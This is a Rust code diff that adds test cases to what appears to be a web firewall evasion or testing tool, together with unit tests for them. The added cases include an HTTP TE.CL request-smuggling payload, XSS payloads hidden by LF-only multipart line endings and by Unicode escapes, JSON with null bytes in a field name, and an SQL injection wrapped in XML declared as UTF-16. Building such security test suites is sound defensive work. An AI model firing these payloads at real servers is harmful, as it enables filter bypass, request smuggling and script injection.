@@ -51,6 +51,11 @@ pub fn curated_parser_discrepancy_pairs(max_pairs: usize) -> Vec<CuratedDiscrepa
         xml_doctype_preamble(),
         clte_request_smuggling(),
         payload_after_inspection_limit(),
+        tecl_request_smuggling(),
+        multipart_lf_only_line_endings(),
+        json_null_byte_field_wrapper(),
+        xml_utf16_charset_declaration(),
+        json_unicode_escaped_payload(),
     ];
 
     let max_pairs = max_pairs.min(all_pairs.len());
@@ -397,6 +402,86 @@ fn payload_after_inspection_limit() -> CuratedDiscrepancyPair {
     }
 }
 
+fn tecl_request_smuggling() -> CuratedDiscrepancyPair {
+    CuratedDiscrepancyPair {
+        name: "TE.CL Request Smuggling".to_string(),
+        canonical_class: "tecl_smuggling".to_string(),
+        content_type: "application/x-www-form-urlencoded".to_string(),
+        payload_family: "protocol-smuggling".to_string(),
+        mutation_cost: 3,
+        control_request: CuratedRequest {
+            method: "POST".to_string(),
+            headers: HashMap::from([(
+                "Transfer-Encoding".to_string(),
+                "chunked".to_string(),
+            )]),
+            body: "4\r\ntest\r\n0\r\n\r\n".to_string(),
+        },
+        variant_request: CuratedRequest {
+            method: "POST".to_string(),
+            headers: HashMap::from([
+                ("Transfer-Encoding".to_string(), "chunked".to_string()),
+                ("Content-Length".to_string(), "3".to_string()),
+            ]),
+            body: "3b\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n".to_string(),
+        },
+    }
+}
+
+fn multipart_lf_only_line_endings() -> CuratedDiscrepancyPair {
+    CuratedDiscrepancyPair {
+        name: "Multipart LF-Only Line Endings".to_string(),
+        canonical_class: "multipart_lf_only".to_string(),
+        content_type: "multipart/form-data".to_string(),
+        payload_family: "xss-multipart".to_string(),
+        mutation_cost: 1,
+        control_request: multipart_control_request(),
+        variant_request: CuratedRequest {
+            method: "POST".to_string(),
+            headers: HashMap::from([(
+                "Content-Type".to_string(),
+                format!("multipart/form-data; boundary={MULTIPART_BOUNDARY}"),
+            )]),
+            body: format!(
+                "--{MULTIPART_BOUNDARY}\nContent-Disposition: form-data; name=\"field1\"\r\n\r\n{XSS_PAYLOAD}\r\n--{MULTIPART_BOUNDARY}--\r\n"
+            ),
+        },
+    }
+}
+
+fn json_null_byte_field_wrapper() -> CuratedDiscrepancyPair {
+    json_pair(
+        "JSON Null Byte Field Wrapper",
+        "json_null_byte_field",
+        2,
+        HashMap::from([("Content-Type".to_string(), "application/json".to_string())]),
+        format!("{{\"\x00field1\x00\":\"{XSS_PAYLOAD}\"}}"),
+    )
+}
+
+fn xml_utf16_charset_declaration() -> CuratedDiscrepancyPair {
+    xml_pair(
+        "XML UTF-16 Charset Declaration",
+        "xml_utf16_charset",
+        2,
+        HashMap::from([(
+            "Content-Type".to_string(),
+            "application/xml; charset=UTF-16LE".to_string(),
+        )]),
+        format!(r#"<?xml version="1.0"?><root><field1>{XML_SQLI_PAYLOAD}</field1></root>"#),
+    )
+}
+
+fn json_unicode_escaped_payload() -> CuratedDiscrepancyPair {
+    json_pair(
+        "JSON Unicode Escaped Payload",
+        "json_unicode_escape",
+        1,
+        HashMap::from([("Content-Type".to_string(), "application/json".to_string())]),
+        r#"{"field1":"\u003cscript\u003ealert(1)\u003c/script\u003e"}"#.to_string(),
+    )
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -465,6 +550,65 @@ mod tests {
         assert!(pairs
             .iter()
             .all(|pair| pair.variant_request.method == "POST"));
+    }
+
+    #[test]
+    fn test_curated_pairs_round2_count() {
+        let pairs = curated_parser_discrepancy_pairs(25);
+        assert_eq!(pairs.len(), 25);
+    }
+
+    #[test]
+    fn test_tecl_pair_has_cl_and_te_headers() {
+        let pairs = curated_parser_discrepancy_pairs(25);
+        let tecl = pairs
+            .iter()
+            .find(|p| p.canonical_class == "tecl_smuggling")
+            .expect("TE.CL pair not found");
+        assert!(tecl.variant_request.headers.contains_key("Content-Length"));
+        assert!(tecl
+            .variant_request
+            .headers
+            .contains_key("Transfer-Encoding"));
+    }
+
+    #[test]
+    fn test_multipart_lf_only_variant_uses_lf() {
+        let pairs = curated_parser_discrepancy_pairs(25);
+        let pair = pairs
+            .iter()
+            .find(|p| p.canonical_class == "multipart_lf_only")
+            .expect("multipart_lf_only pair not found");
+        // Variant body must contain LF-only boundary (no preceding \r)
+        assert!(pair
+            .variant_request
+            .body
+            .contains(&format!("--{MULTIPART_BOUNDARY}\n")));
+        assert!(!pair
+            .variant_request
+            .body
+            .starts_with(&format!("--{MULTIPART_BOUNDARY}\r\n")));
+    }
+
+    #[test]
+    fn test_json_null_byte_variant_contains_null() {
+        let pairs = curated_parser_discrepancy_pairs(25);
+        let pair = pairs
+            .iter()
+            .find(|p| p.canonical_class == "json_null_byte_field")
+            .expect("json_null_byte_field pair not found");
+        assert!(pair.variant_request.body.contains("\x00field1\x00"));
+    }
+
+    #[test]
+    fn test_json_unicode_escape_variant_body() {
+        let pairs = curated_parser_discrepancy_pairs(25);
+        let pair = pairs
+            .iter()
+            .find(|p| p.canonical_class == "json_unicode_escape")
+            .expect("json_unicode_escape pair not found");
+        assert!(pair.variant_request.body.contains("\\u003c"));
+        assert!(!pair.variant_request.body.contains('<'));
     }
 
     #[test]
